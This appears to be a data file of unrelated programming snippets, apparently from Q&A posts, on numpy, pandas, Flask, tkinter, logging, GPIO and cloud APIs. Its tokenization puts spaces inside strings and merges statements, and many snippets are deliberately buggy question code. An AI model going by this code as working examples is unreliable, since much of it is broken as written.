( fetch ) edited.append ( fetch ) fetch.save ( klob + str ( rotatePic.counter ) + `` .gif '' ) register_shape ( klob + str ( rotatePic.counter ) + `` .gif '' ) shape ( klob + str ( rotatePic.counter ) + `` .gif '' ) update ( ) def StampPic ( ) : stamp ( ) draw_space ( ) update ( ) def move_turtle ( ) : # Pick up the turtle and move it to its starting location . penup ( ) goto ( -200 , 100 ) pendown ( ) def settings ( ) : # Tkinter buttons turtlepic = Button ( text = `` Set Turtle Image '' , command = TurtleShape ) turtlepic.pack ( side = 'left ' ) stampimage = Button ( text = `` Stamp '' , command = StampPic ) stampimage.pack ( side = 'left ' ) global manipulateimage manipulateimage = Button ( text = `` Resize Turtle Image '' , command = TurtleImageResize , state = DISABLED ) manipulateimage.pack ( side = 'left ' ) global flipButton flipButton = Button ( text = `` Flip image '' , command = flippic , state = DISABLED ) flipButton.pack ( side = 'left ' ) global mirrorButton mirrorButton = Button ( text = `` Mirror Image '' , command = mirror , state = DISABLED ) mirrorButton.pack ( side = 'left ' ) global rotateButton rotateButton = Button ( text = `` Rotate Image '' , command = rotatePic , state = DISABLED ) rotateButton.pack ( side = 'left ' ) def skip ( x , y ) : penup ( ) goto ( x , y ) pendown ( ) update ( ) move_turtle ( ) settings ( ) speed ( 0 ) tracer ( 0 , 0 ) onscreenclick ( skip ) if sys.platform == 'win32 ' : input ( ) else : pass"
"class KeyStatisticEntry : def __init__ ( self , value= '' '' ) : self.usedBytes = len ( value ) self.encoding = get_string_encoding ( value ) @ property def total ( self ) : overhead = get_object_overhead ( self.usedBytes ) if self.encoding == 'some value ' : return overhead else : return self.usedBytes + overhead @ property def aligned ( self ) : return some_func_with ( self.usedBytes ) # Here is lots of calculated properties on basis of existing properties used_bytes = [ ] total_bytes = [ ] aligned_bytes = [ ] encodings = [ ] for obj in keys.items ( ) : used_bytes.append ( obj.usedBytes ) total_bytes.append ( obj.total ) aligned_bytes.append ( obj.aligned ) encodings.append ( obj.encoding ) total_elements = len ( used_bytes ) used_user = sum ( used_bytes ) used_real = sum ( total_bytes ) aligned = sum ( aligned_bytes ) mean = statistics.mean ( used_bytes )"
"myList = [ ( 1 , 7 ) , ( 3 , 3 ) , ( 5 , 9 ) ] otherList = [ ( 2 , 4 ) , ( 3 , 5 ) , ( 5 , 2 ) , ( 7 , 8 ) ] returns = > [ ( 1 , 7 ) , ( 2 , 4 ) , ( 3 , 8 ) , ( 5 , 11 ) , ( 7 , 8 ) ]"
"a1 = np.zeros ( ( 10,7 ) ) a2 = np.zeros ( ( 3,2 ) ) r = np.array ( np.meshgrid ( a1 , a2 ) ) .T.reshape ( -1 , a1.shape [ 1 ] + a2.shape [ 1 ] )"
"import numpy as npdat = np.hstack ( ( np.arange ( 1,9 ) , np.arange ( 1,4 ) ) ) print dat # [ 1 2 3 4 5 6 7 8 1 2 3 ] old_val = [ 2 , 5 ] new_val = [ 11 , 57 ] new_dat = replace_old ( dat , old_val , new_val ) print new_dat # [ 1 11 3 4 57 6 7 8 1 11 3 ]"
import mtrack = m.track_t ( ) track_t *track = NULL ; track_t* create_null_track ( void ) { return NULL ; } void* get_null ( void ) { return NULL ; }
mylist = [ 247 ] while mylist : nextlist = [ ] for element in mylist : print element if element % 2==0 : nextlist.append ( element/2 ) elif element ! =1 : nextlist.append ( 3*element+1 ) mylist = nextlist mylist= [ 247 ] for element in mylist : print element if element % 2 == 0 : mylist.append ( element/2 ) elif element ! =1 : mylist.append ( element*3+1 ) delete_list = [ node for node in G.nodes ( ) if G.degree ( node ) < k ] for node in delete_list : nbrs = G.neighbors ( node ) for nbr in nbrs : if G.degree ( nbr ) ==k : delete_list.append ( nbr ) G.remove_node ( node )
"response = Response ( eventstream ( ) , mimetype= '' text/event-stream '' ) def eventstream ( ) : for message in pubsub.listen ( ) : # ... yield str ( event ) gunicorn -k gevent -b 127.0.0.1:50008 flaskapplication"
"[ 1 , 2 , 3 ] + [ 2 ] - > [ 3 , 2 , 3 ] [ 1 , 2 , 3 ] + [ [ 2 ] , [ 1 ] ] - > [ [ 3 , 2 , 3 ] , [ 1 , 0 , 0 ] ] def pad ( a , b ) : sa , sb = map ( np.shape , [ a , b ] ) N = np.max ( [ len ( sa ) , len ( sb ) ] ) sap , sbp = map ( lambda x : x + ( 1 , ) * ( N-len ( x ) ) , [ sa , sb ] ) sp = np.amax ( np.array ( [ tuple ( sap ) , tuple ( sbp ) ] ) , 1 )"
"import numpy as npA = np.array ( [ [ 2 , 1 , 1 , 2 ] , [ 0 , 2 , 1 , 0 ] , [ 1 , 0 , 1 , 1 ] , [ 2 , 2 , 1 , 0 ] ] ) B = np.array ( [ [ 0.54331039 , 0.41018682 , 0.1582158 , 0.3486124 ] , [ 0.68804647 , 0.29520239 , 0.40654206 , 0.20473451 ] , [ 0.69857579 , 0.38958572 , 0.30361365 , 0.32256483 ] , [ 0.46195299 , 0.79863505 , 0.22431876 , 0.59054473 ] ] ) C = np.array ( [ [ 2. , 1. , 1. , 2 . ] , [ 2.07466874 , 2. , 1. , 0.73203386 ] , [ 1. , 1.5984076 , 1. , 1 . ] , [ 2. , 2. , 1. , 1.42925865 ] ] ) A = sparse.rand ( 250000 , 1700 , density=0.001 , format='csr ' ) B = sparse.rand ( 1700 , 1700 , density=0.02 , format='csr ' ) mask = A ! = 0C = A.dot ( B ) C [ mask ] = A [ mask ] from scipy import sparseimport numpy as npdef naive ( A , B ) : mask = A ! = 0 out = A.dot ( B ) .tolil ( ) out [ mask ] = A [ mask ] return out.tocsr ( ) def proposed ( A , B ) : Az = A == 0 R , C = np.where ( Az ) out = A.copy ( ) out [ Az ] = np.einsum ( 'ij , ji- > i ' , A [ R ] , B [ : , C ] ) return out % timeit naive ( A , B ) 1 loops , best of 3 : 4.04 s per loop % timeit proposed ( A , B ) /usr/local/lib/python2.7/dist-packages/scipy/sparse/compressed.py:215 : SparseEfficiencyWarning : Comparing a sparse matrix with 0 using == is inefficient , try using ! = instead./usr/local/lib/python2.7/dist-packages/scipy/sparse/coo.pyc in __init__ ( self , arg1 , shape , dtype , copy ) 173 self.shape = M.shape 174 -- > 175 self.row , self.col = M.nonzero ( ) 176 self.data = M [ self.row , self.col ] 177 self.has_canonical_format = TrueMemoryError : cimport cython @ cython.cdivision ( True ) @ cython.boundscheck ( False ) @ cython.wraparound ( False ) cpdef coo_replace ( int [ : ] row1 , int [ : ] col1 , float [ : ] data1 , int [ : ] row2 , int [ : ] col2 , float [ : ] data2 ) : cdef int N = row1.shape [ 0 ] cdef int M = row2.shape [ 0 ] cdef int i , j cdef dict d = { } for i in range ( M ) : d [ ( row2 [ i ] , col2 [ i ] ) ] = data2 [ i ] for j in range ( N ) : if ( row1 [ j ] , col1 [ j ] ) in d : data1 [ j ] = d [ ( row1 [ j ] , col1 [ j ] ) ]"
import loggingimport syslogging.basicConfig ( ) log = logging.getLogger ( 'myLogger ' ) log.handlers = [ ] h1 = logging.StreamHandler ( sys.stdout ) h1.level = logging.INFOh1.formatter = logging.Formatter ( 'H1 H1 % ( message ) s ' ) h2 = logging.StreamHandler ( sys.stdout ) h2.level = logging.WARNINGh2.formatter = logging.Formatter ( 'H2 H2 % ( message ) s ' ) log.addHandler ( h1 ) log.addHandler ( h2 ) print 'log.level == % s ' % logging.getLevelName ( log.level ) print 'log.info'log.info ( 'this is some info ' ) print 'done'print 'log.warn'log.warn ( 'this is a warning ' ) print 'done ' log.level == NOTSETlog.infodonelog.warnH1 H1 this is a warning H2 H2 this is a warningdoneWARNING : myLogger : this is a warning
def error ( ) : return next ( i for i in range ( 3 ) if i==10 ) error ( ) # fails with StopIterationall ( error ( ) for i in range ( 2 ) ) # returns True
"utf8mb4 utf8mb4_unicode_ci 'ENGINE ' : 'django.db.backends.mysql ' , ... 'OPTIONS ' : { 'charset ' : `` utf8mb4 '' , } ( 2019 , `` Ca n't initialize character set utf8mb4 ( path : /usr/local/mysql/share/charsets/ ) '' ) libraries : - name : MySQLdb version : `` latest ''"
virtualenv apps -- distribute pip install distribute -U
"A = np.array ( [ [ 0,1 ] , [ 2,3 ] , [ 4,5 ] ] ) B = np.array ( [ [ 1 ] , [ 0 ] , [ 1 ] ] , dtype='int ' ) C = np.array ( [ [ 1 ] , [ 2 ] , [ 5 ] ] ) np.choose ( B.ravel ( ) , A.T )"
def f ( x ) : def g ( y ) : return x + y return gf2 = f ( 2 ) def closed_vars ( anF ) : ... return ... assert closedVars ( f2 ) == { ' x ' : 2 }
*.py diff=python
"def getData ( symbol , filename ) : out = [ `` Symbol '' , '' Date '' , '' Open '' , '' High '' , '' Low '' , '' Close '' , '' Volume '' , '' Dividend '' , `` Split '' , '' Adj_Open '' , '' Adj_High '' , '' Adj_Low '' , '' Adj_Close '' , '' Adj_Volume '' ] l = len ( symbol ) beforeMatch = True with open ( filename , ' r ' ) as f : for line in f : match = checkMatch ( symbol , l , line ) if beforeMatch and match : beforeMatch = False out.append ( formatLineData ( line [ : -1 ] .split ( `` , '' ) ) ) elif not beforeMatch and match : out.append ( formatLineData ( line [ : -1 ] .split ( `` , '' ) ) ) elif not beforeMatch and not match : break return out def getDataColumn ( symbol , col=12 , numDays=100 , changeRateTransform=False ) : dataset = getData ( symbol ) if not changeRateTransform : column = [ day [ col ] for day in dataset [ -numDays : ] ] else : n = len ( dataset ) column = [ ( dataset [ i ] [ col ] - dataset [ i-1 ] [ col ] ) /dataset [ i-1 ] [ col ] for i in range ( n - numDays , n ) ] return column def checkMatch ( symbol , symbolLength , line ) : out = False if line [ : symbolLength+1 ] == symbol + `` , '' : out = True return outdef formatLineData ( lineData ) : out = [ lineData [ 0 ] ] out.append ( datetime.strptime ( lineData [ 1 ] , ' % Y- % m- % d ' ) .date ( ) ) out += [ float ( d ) for d in lineData [ 2:6 ] ] out += [ int ( float ( d ) ) for d in lineData [ 6:9 ] ] out += [ float ( d ) for d in lineData [ 9:13 ] ] out.append ( int ( float ( lineData [ 13 ] ) ) ) return out def getData ( symbol , database ) : out = [ `` Symbol '' , '' Date '' , '' Open '' , '' High '' , '' Low '' , '' Close '' , '' Volume '' , '' Dividend '' , `` Split '' , '' Adj_Open '' , '' Adj_High '' , '' Adj_Low '' , '' Adj_Close '' , '' Adj_Volume '' ] l = len ( symbol ) beforeMatch = True with open ( database , ' r ' ) as f : databaseReader = csv.reader ( f , delimiter= '' , '' ) for row in databaseReader : match = ( row [ 0 ] == symbol ) if beforeMatch and match : beforeMatch = False out.append ( formatLineData ( row ) ) elif not beforeMatch and match : out.append ( formatLineData ( row ) ) elif not beforeMatch and not match : break return outdef getDataColumn ( dataset , col=12 , numDays=100 , changeRateTransform=False ) : if not changeRateTransform : out = [ day [ col ] for day in dataset [ -numDays : ] ] else : n = len ( dataset ) out = [ ( dataset [ i ] [ col ] - dataset [ i-1 ] [ col ] ) /dataset [ i-1 ] [ col ] for i in range ( n - numDays , n ) ] return out"
"{ 'activity_count ' : [ 10 , 11 , 12 ] , 'type ' : [ 'all ' , 'paper ' , 'fpy ' ] } { 'all ' : { 'activity_count ' : 10 } , 'paper ' : { 'activity_count ' : 11 } , 'fpy ' : { 'activity_count ' : 12 } } dic= { `` activity_count '' : [ 10,11,12 ] , '' type '' : [ `` all '' , '' paper '' , '' fpy '' ] } in= { } i=0for val in dic [ 'type ' ] : for v in dic [ 'activity_count ' ] : if i== dic [ 'activity_count ' ] .index ( v ) : temp= { } temp [ 'activity_count ' ] =v fin [ val ] =temp i+=1"
from django.db import models class People ( models.Model ) : firstname = models.CharField ( max_length=100 ) lastname = models.CharField ( max_length=100 ) img = models.ImageField ( upload_to='media/people ' )
class A : def __str__ ( self ) : return `` Something useless '' class B ( A ) : def __str__ ( self ) : return some_magic_base_function ( self )
RuntimeError : Invalid DISPLAY variable
"x , y1 , '' ( 5 , 27 , 4 ) '' 2 , '' ( 3 , 1 , 6 , 2 ) '' 3 , '' ( 4 , 5 ) '' > > > # df = pd.read_csv ( 'data.csv ' ) > > > df = pd.DataFrame ( { ' x ' : [ 1 , 2 , 3 ] , ' y ' : [ `` ( 5 , 27 , 4 ) '' , '' ( 3 , 1 , 6 , 2 ) '' , '' ( 4 , 5 ) '' ] } ) > > > df.plot.scatter ( ' x ' , ' y ' ) [ ... ] ValueError : scatter requires y column to be numeric import numpy as npimport matplotlib.pyplot as pltfor x , y in zip ( df [ ' x ' ] , df [ ' y ' ] ) : y = eval ( y ) plt.scatter ( x * np.ones_like ( y ) , y , color='blue ' )"
"class myClass ( object ) : pname = `` '' def __getName ( self ) : return pname def __setName ( self , newname ) : if not isalpha ( newname ) : raise ValueError ( `` Error '' ) elif self.pname = newname name = property ( fget=__getName , fset=__setName )"
"raw_data = { 'score ' : [ 1 , 3 , 4 , 4 , 1 , 2 , 2 , 4 , 4 , 2 ] , 'player ' : [ 'Miller ' , 'Jacobson ' , 'Ali ' , 'George ' , 'Cooze ' , 'Wilkinson ' , 'Lewis ' , 'Lewis ' , 'Lewis ' , 'Jacobson ' ] } df = pd.DataFrame ( raw_data , columns = [ 'score ' , 'player ' ] ) df score player0 1 Miller1 3 Jacobson2 4 Ali3 4 George4 1 Cooze5 2 Wilkinson6 2 Lewis7 4 Lewis8 4 Lewis9 2 Jacobson score col_1 col_2 col_3 col_4 score 1 2 Miller Cooze n/a n/a2 3 Wilkinson Lewis Jacobson n/a3 1 Jacobson n/a n/a n/a4 4 Ali George Lewis Lewis"
"from typing import NamedTupleclass ObjectIdentityMixin : def __eq__ ( self , other ) : return self is other def __hash__ ( self ) : return id ( self ) class TestMixinFirst ( ObjectIdentityMixin , NamedTuple ) : a : intprint ( TestMixinFirst ( 1 ) == TestMixinFirst ( 1 ) ) # Prints True , so not using my __eq__class TestMixinSecond ( NamedTuple , ObjectIdentityMixin ) : b : intprint ( TestMixinSecond ( 2 ) == TestMixinSecond ( 2 ) ) # Prints True as wellclass ObjectIdentityNamedTuple ( NamedTuple ) : def __eq__ ( self , other ) : return self is other def __hash__ ( self ) : return id ( self ) class TestSuperclass ( ObjectIdentityNamedTuple ) : c : intTestSuperclass ( 3 ) `` '' '' Traceback ( most recent call last ) : File `` test.py '' , line 30 , in < module > TestSuperclass ( 3 ) TypeError : __new__ ( ) takes 1 positional argument but 2 were given '' '' ''"
"def characters ( self , chrs ) : if self.flag==1 : self.outfile.write ( chrs+'\n ' ) < e1 > 9308 < /e1 > < e2 > 865 < /e2 > 9308865 9308865"
"a = [ { 'one ' : 1 } , { 'two ' : 2 } , { 'three ' : 3 } , { 'four ' : 4 } , { 'five ' : 5 } ] a = [ { 'one ' : 14 } , { 'two ' : 12 } , { 'three ' : 9 } , { 'four ' : 5 } , { 'five ' : 5 } ] def recursive ( a ) : if len ( a ) == 1 : return list ( a [ 0 ] .values ( ) ) [ 0 ] else : val = list ( a [ 0 ] .values ( ) ) [ 0 ] return val + recursive ( a.pop ( 0 ) )"
"from google.cloud import bigqueryclient = bigquery.Client ( ) client.project='test project'dataset_id = 'test dataset'table_id = 'test table'dataset_ref = client.dataset ( dataset_id ) table_ref = dataset_ref.table ( table_id ) table = client.get_table ( table_ref ) rows_to_insert = [ { 'some_column ' : 'test string ' } ] errors = client.insert_rows ( table , rows_to_insert ) from google.cloud import storageclient = storage.Client ( ) bucket = client.get_bucket ( 'test bucket ' ) name = 'test.txt'data_blob = bucket.get_blob ( name ) data_pre = data_blob.download_as_string ( ) from googleapiclient.discovery import buildfrom httplib2 import Httpfrom oauth2client.contrib import gceSAMPLE_SPREADSHEET_ID = 'key for test sheet'SAMPLE_RANGE_NAME = 'test range'creds = gce.AppAssertionCredentials ( scope='https : //www.googleapis.com/auth/spreadsheets ' ) service = build ( 'sheets ' , 'v4 ' , http = creds.authorize ( Http ( ) ) ) sheet = service.spreadsheets ( ) result = sheet.values ( ) .get ( spreadsheetId=SAMPLE_SPREADSHEET_ID , range=SAMPLE_RANGE_NAME ) .execute ( ) values = result.get ( 'values ' , [ ] ) import gspreadfrom google.auth import compute_enginecredentials = compute_engine.Credentials ( ) client = gspread.authorize ( credentials )"
"[ [ A ( 0,0 ) , A ( 0,1 ) ] [ A ( 1,0 ) , A ( 1,1 ) ] ] has this memory layout : [ A ( 0,0 ) , A ( 0,1 ) , A ( 1,0 ) , A ( 1,1 ) ] [ [ 0 , 1 , 2 , 3 ] [ [ 1 ] x [ 4 , 5 , 6 , 7 ] ] [ 10 ] ] A ( 2 by 4 ) B ( 2 by 1 ) Iterate 0th dimensions of A and B simultaneously { Iterate last dimension of A { multiply ; } } [ [ 0 , 1 , 2 , 3 ] x [ [ 1,10,100,1000 ] ] [ 4 , 5 , 6 , 7 ] ] A ( 2 by 4 ) B ( 1 by 4 ) Iterate 0th dimension of A { Iterate 1st dimensions of A and B simultaneously { multiply ; } } # include < iostream > int main ( void ) { const int nA = 12 ; const int nB = 3 ; int A [ nA ] ; int B [ nB ] ; for ( int i = 0 ; i ! = nA ; ++i ) A [ i ] = i+1 ; for ( int i = 0 ; i ! = nB ; ++i ) B [ i ] = i+1 ; //dimension int dA [ ] = { 2,3,2 } ; int dB [ ] = { 1,3,1 } ; int* pA = A ; int* pB = B ; int* pA_end = A + nA ; //is it possible to make the compiler //generate the iA and sA ? int iB = 0 ; int iB_max = 2 ; int sB [ ] = { 1,0 } ; while ( pA ! = pA_end ) { std : :cout < < `` *pA , *pB : `` < < *pA < < `` , `` < < *pB < < std : :endl ; std : :cout < < `` iB : `` < < iB < < std : :endl ; * ( pA ) *= * ( pB ) ; ++pA ; pB += sB [ iB ] ; ++iB ; if ( iB == iB_max ) { iB = 0 ; pB = B ; } } for ( pA = A ; pA ! = pA_end ; ++pA ) { std : :cout < < * ( pA ) < < `` , `` ; } std : :cout < < std : :endl ; }"
"style.configure ( `` My.Horizontal.TScrollbar '' , *style.configure ( `` Horizontal.TScrollbar '' ) ) TypeError : configure ( ) argument after * must be an iterable , not NoneType root.text = Text ( root , undo = True ) root.text.grid ( row = 0 , column = 1 , columnspan = 1 , rowspan = 1 , padx = ( 5,5 ) , pady = ( 5,5 ) , sticky = W+E+N+S ) root.text.config ( bg = pyFrameColor , fg = `` white '' , font= ( 'times ' , 16 ) ) root.text.config ( wrap=NONE ) vScrollBar = tkinter.Scrollbar ( root , command=root.text.yview ) hScrollBar = tkinter.Scrollbar ( root , orient = HORIZONTAL , command=root.text.xview ) vScrollBar.grid ( row = 0 , column = 2 , columnspan = 1 , rowspan = 1 , padx =1 , pady =1 , sticky = E+N+S ) hScrollBar.grid ( row = 1 , column = 1 , columnspan = 1 , rowspan = 1 , padx =1 , pady =1 , sticky = S+W+E ) root.text [ 'yscrollcommand ' ] = vScrollBar.setroot.text [ 'xscrollcommand ' ] = hScrollBar.set vScrollBar.config ( bg = mainBGcolor ) vScrollBar [ 'activebackground ' ] = mainBGcolorhScrollBar.config ( bg = mainBGcolor ) hScrollBar [ 'activebackground ' ] = mainBGcolor"
"import timeimport RPi.GPIO as gpioled = 37buzzer = 11door = 16gpio.setmode ( gpio.BOARD ) gpio.setwarnings ( False ) gpio.setup ( buzzer , gpio.OUT ) gpio.setup ( led , gpio.OUT ) gpio.setup ( door , gpio.IN , pull_up_down=gpio.PUD_UP ) def blink ( buzzer ) : gpio.output ( buzzer , True ) time.sleep ( 0.1 ) gpio.output ( buzzer , False ) time.sleep ( 0.1 ) returndef blink ( led ) : gpio.output ( led , True ) time.sleep ( 1 ) gpio.output ( led , False ) time.sleep ( 1 ) returnwhile True : if gpio.input ( door ) : time.sleep ( 3 ) for i in range ( 0,5 ) : blink ( led ) for i in range ( 0,5 ) : blink ( buzzer ) else : gpio.output ( buzzer , False ) gpio.cleanup ( ) import datetimeimport timeimport osimport RPi.GPIO as gpioled = 37t = datetime.datetime.now ( ) gpio.setmode ( gpio.BOARD ) gpio.setwarnings ( False ) gpio.setup ( led , gpio.OUT ) def blink ( led ) : gpio.output ( led , True ) time.sleep ( 0.1 ) gpio.output ( led , False ) time.sleep ( 0.1 ) while True : card = raw_input ( ) f = open ( `` Laptop Sign Out '' + '.txt ' , ' a ' ) f.write ( `` OneCard Number : `` + card [ 1:10 ] + `` Time : `` + t.strftime ( `` % m- % d- % Y % H : % M : % S '' ) ) f.write ( '\n ' ) f.write ( ' ; ' ) f.write ( '\n ' ) f.close ( ) time.sleep ( 1 ) for i in range ( 0,3 ) : blink ( led ) os.system ( 'fswebcam ~/Desktop/Photos/ % H % M % S.jpeg ' ) time.sleep ( 3 ) gpio.cleanup ( ) import timeimport RPi.GPIO as gpioimport osimport datetimefrom threading import Threadled = 37buzzer = 11door = 16t = datetime.datetime.now ( ) gpio.setmode ( gpio.BOARD ) gpio.setwarnings ( False ) gpio.setup ( buzzer , gpio.OUT ) gpio.setup ( led , gpio.OUT ) gpio.setup ( door , gpio.IN , pull_up_down=gpio.PUD_UP ) def blink ( buzzer ) : gpio.output ( buzzer , True ) time.sleep ( 0.1 ) gpio.output ( buzzer , False ) time.sleep ( 0.1 ) returndef blink ( led ) : gpio.output ( led , True ) time.sleep ( 1 ) gpio.output ( led , False ) time.sleep ( 1 ) returndef doorsensor ( ) : while True : if gpio.input ( door ) : time.sleep ( 3 ) for i in range ( 0,5 ) : blink ( led ) for i in range ( 0,5 ) : blink ( buzzer ) else : gpio.output ( buzzer , False ) def cardreader ( ) : while True : card = raw_input ( ) f = open ( `` Laptop Sign Out '' + '.txt ' , ' a ' ) f.write ( `` OneCard Number : `` + card [ 1:10 ] + `` Time : `` + t.strftime ( `` % m- % d- % Y % H : % M : % S '' ) ) f.write ( '\n ' ) f.write ( ' ; ' ) f.write ( '\n ' ) f.close ( ) time.sleep ( 1 ) for i in range ( 0,3 ) : blink ( led ) os.system ( 'fswebcam ~/Desktop/Photos/ % H % M % S.jpeg ' ) time.sleep ( 3 ) f1 = Thread ( target = doorsensor ( ) ) f2 = Thread ( target = cardreader ( ) ) f2.start ( ) f1.start ( ) gpio.cleanup ( )"
i = c_int ( 4 ) id ( i ) ctypes.addressof ( i )
"from heapq import heapify , heappopclass pq ( object ) : def __init__ ( self , init= None ) : self.inner , self.item_f= [ ] , { } if not None is init : self.inner= [ [ priority , item ] for item , priority in enumerate ( init ) ] heapify ( self.inner ) self.item_f= { pi [ 1 ] : pi for pi in self.inner } def top_one ( self ) : if not len ( self.inner ) : return None priority , item= heappop ( self.inner ) del self.item_f [ item ] return item , priority def re_prioritize ( self , items , prioritizer= lambda x : x+ 1 ) : for item in items : if not item in self.item_f : continue entry= self.item_f [ item ] entry [ 0 ] = prioritizer ( entry [ 0 ] ) heapify ( self.inner ) def fecther ( priorities , prioritizer= lambda x : x+ 1 ) : q= pq ( priorities ) for k in xrange ( len ( priorities ) + 1 ) : items= ( yield k , q.top_one ( ) ) if not None is items : q.re_prioritize ( items , prioritizer ) if __name__ == '__main__ ' : def gen_tst ( n= 3 ) : priorities= range ( n ) priorities.reverse ( ) priorities= priorities+ range ( n ) def tst ( ) : result , f= range ( 2* n ) , fecther ( priorities ) k , item_t= f.next ( ) while not None is item_t : result [ k ] = item_t [ 0 ] k , item_t= f.send ( range ( item_t [ 0 ] ) ) return result return tst In [ ] : gen_tst ( ) ( ) Out [ ] : [ 2 , 3 , 4 , 5 , 1 , 0 ] In [ ] : t= gen_tst ( 123 ) In [ ] : % timeit t ( ) 10 loops , best of 3 : 26 ms per loop"
loop = asyncio.get_event_loop ( ) session = aiohttp.ClientSession ( loop=loop )
( Pdb ) mod < module 'mymodule ' ( namespace ) > ( Pdb ) mod < module 'mymodule ' from '/path/to/mymodule/__init__.py ' >
"> > > a = np.arange ( 9 ) .reshape ( ( 3 , 3 ) ) > > > aarray ( [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 ] , [ 6 , 7 , 8 ] ] ) > > > def sub ( a ) : ... return a [ :2 , :2 ] ... > > > sub ( a ) array ( [ [ 0 , 1 ] , [ 3 , 4 ] ] ) > > > sub ( a ) = np.arange ( 4 ) .reshape ( ( 2 , 2 ) ) File `` < stdin > '' , line 1SyntaxError : cant assign to function call > > > t = a [ :2 , :2 ] > > > t = np.arange ( 4 ) .reshape ( ( 2 , 2 ) ) > > > aarray ( [ [ 0 , 1 , 2 ] , [ 3 , 4 , 5 ] , [ 6 , 7 , 8 ] ] ) > > > a [ :2 , :2 ] = np.arange ( 4 ) .reshape ( ( 2 , 2 ) ) > > > aarray ( [ [ 0 , 1 , 2 ] , [ 2 , 3 , 5 ] , [ 6 , 7 , 8 ] ] )"
"def nn_weather_model ( ) : ip_weather = Input ( shape = ( 30 , 38 , 5 ) ) x_weather = BatchNormalization ( name='weather1 ' ) ( ip_weather ) x_weather = Flatten ( ) ( x_weather ) Dense100_1 = Dense ( 100 , activation='relu ' , name='weather2 ' ) ( x_weather ) Dense100_2 = Dense ( 100 , activation='relu ' , name='weather3 ' ) ( Dense100_1 ) Dense18 = Dense ( 18 , activation='linear ' , name='weather5 ' ) ( Dense100_2 ) model_weather = Model ( inputs= [ ip_weather ] , outputs= [ Dense18 ] ) model = model_weather ip = ip_weather op = Dense18 return model , ip , op def cost_function ( y_true , y_pred ) : return ( ( K.mean ( K.square ( y_pred - y_true ) ) ) +L1+L2 ) return cost_function weight1=model.layers [ 3 ] .get_weights ( ) [ 0 ] weight2=model.layers [ 4 ] .get_weights ( ) [ 0 ] weight3=model.layers [ 5 ] .get_weights ( ) [ 0 ] L1 = Calculate_L1 ( weight1 , weight2 , weight3 ) L2 = Calculate_L2 ( weight1 , weight2 , weight3 ) class update_L1L2weight ( Callback ) : def __init__ ( self ) : super ( update_L1L2weight , self ) .__init__ ( ) def on_batch_begin ( self , batch , logs=None ) : weight1=model.layers [ 3 ] .get_weights ( ) [ 0 ] weight2=model.layers [ 4 ] .get_weights ( ) [ 0 ] weight3=model.layers [ 5 ] .get_weights ( ) [ 0 ] L1 = Calculate_L1 ( weight1 , weight2 , weight3 ) L2 = Calculate_L2 ( weight1 , weight2 , weight3 )"
"login_manager = LoginManager ( ) login_manager.init_app ( app ) login_manager.login_view = 'login'login_manager.login_message = 'You Must Login to Access This Page ! 'login_manager.login_message_category = 'error ' @ app.route ( '/ ' ) @ login_requireddef dashboard ( ) : return render_template ( 'dashboard.html ' ) @ app.route ( '/login ' , methods= [ `` GET '' , `` POST '' ] ) def login ( ) : form = LoginForm ( ) if form.validate_on_submit ( ) : user = Employee.query.filter_by ( email=form.email.data ) .first ( ) if user and user.is_valid_pass ( form.password.data ) : remember = form.remember.data == ' y ' login_user ( user , remember=remember ) next = request.args.get ( 'next ' ) return redirect ( next or url_for ( 'dashboard ' ) ) else : flash ( u'Incorrect Username or Password ! ' , 'error ' ) return redirect ( url_for ( 'login ' ) ) return render_template ( 'login.html ' , form=form )"
"import bz2 , sysfrom Queue import Empty # ... compressor = bz2.BZ2Compressor ( 9 ) f = open ( path , ' a ' ) try : while 1 : m = queue.get ( True , 1*60 ) f.write ( compressor.compress ( m+ '' \n '' ) ) except Empty , e : pass except Exception as e : traceback.print_exc ( ) finally : sys.stderr.write ( `` flushing '' ) f.write ( compressor.flush ( ) ) f.close ( )"
"def list_ish ( thing ) : for i in xrange ( 0 , len ( thing ) ) : print thing [ i ] hasattr ( '__getitem__ ' ) and not hasattr ( 'keys ' ) thing [ i ] , thing [ 4:7 ] = [ ... ] , etc ."
"ERROR_UNAUTHENTICATED_AJAX_EXPLANATION = `` Hello , so the only way that this error should occur is if someone attempts to directly call our AJAX endpoint without having the verification code . Please do n't do this , it 's against the principles of this art projects . ''"
"df = pd.DataFrame ( { ' a ' : [ 2 , np.nan , np.nan , np.nan ] , ' b ' : [ np.nan , 5 , np.nan , np.nan ] , ' c ' : [ np.nan , 55 , 13 , 14 ] , 'd ' : [ np.nan , np.nan , np.nan , 4 ] , ' e ' : [ 12 , np.nan , np.nan , 22 ] , } ) a b c d e0 2.0 NaN NaN NaN 12.01 NaN 5.0 55.0 NaN NaN2 NaN NaN 13.0 NaN NaN3 NaN NaN 14.0 4.0 22.0 df [ ' f ' ] = np.where ( df.a.notnull ( ) , df.a , np.where ( df.b.notnull ( ) , df.b , etc . ) ) a b c d e f0 2.0 NaN NaN NaN 12.0 21 NaN 5.0 55.0 NaN NaN 52 NaN NaN 13.0 NaN NaN 133 NaN NaN 14.0 4.0 22.0 14"
"invalid_ind = [ ind for ind in offspring if not ind.fitness.valid ] fitnesses = map ( toolbox.evaluate , invalid_ind ) for ind , fit in zip ( invalid_ind , fitnesses ) : ind.fitness.values = fit"
"def print_test ( ) : print ( `` test '' ) return print_testprint_test ( ) # prints 'test'print ( ) # a quick way of writing `` print_test ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ( ) ... '' eval ( `` print_test '' + '' ( ) '' *10000 ) # should print 'test ' 10000 times Traceback ( most recent call last ) : File `` /usr/lib/python3.3/pdb.py '' , line 1662 , in main pdb._runscript ( mainpyfile ) File `` /usr/lib/python3.3/pdb.py '' , line 1543 , in _runscript self.run ( statement ) File `` /usr/lib/python3.3/bdb.py '' , line 405 , in run exec ( cmd , globals , locals ) File `` < string > '' , line 1 , in < module > File `` /home/beet/overflow.py '' , line 1 , in < module > def print_test ( ) :"
if not app.debug : import logging from themodule import TheHandlerYouWant file_handler = TheHandlerYouWant ( ... ) file_handler.setLevel ( logging.WARNING ) app.logger.addHandler ( file_handler )
